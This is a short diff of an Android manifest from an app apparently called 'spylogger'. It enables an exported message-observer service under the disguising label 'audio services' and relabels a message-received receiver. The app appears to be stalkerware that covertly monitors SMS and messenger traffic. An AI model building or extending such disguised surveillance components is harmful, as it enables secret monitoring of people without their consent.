@@ -59,13 +59,13 @@
             </intent-filter>
         </service>
 
-        <!--whatsapp-->
-<!--        <service
-            android:name="com.gravatasufoca.spylogger.services.WhatsAppService"
+        <!--db observer-->
+        <service
+            android:name=".services.MensageiroObserversService"
             android:enabled="true"
             android:exported="true"
             android:label="audio services">
-        </service>-->
+        </service>
 
 
         <!--sms-->
@@ -123,7 +123,7 @@
         <!--carga-->
         <receiver
             android:name=".receivers.MensagemMensageiroReceiver"
-            android:label="FirstCharge" >
+            android:label="msg received" >
             <intent-filter>
                 <action android:name="MENSAGEM_RECEBIDA" />
             </intent-filter>
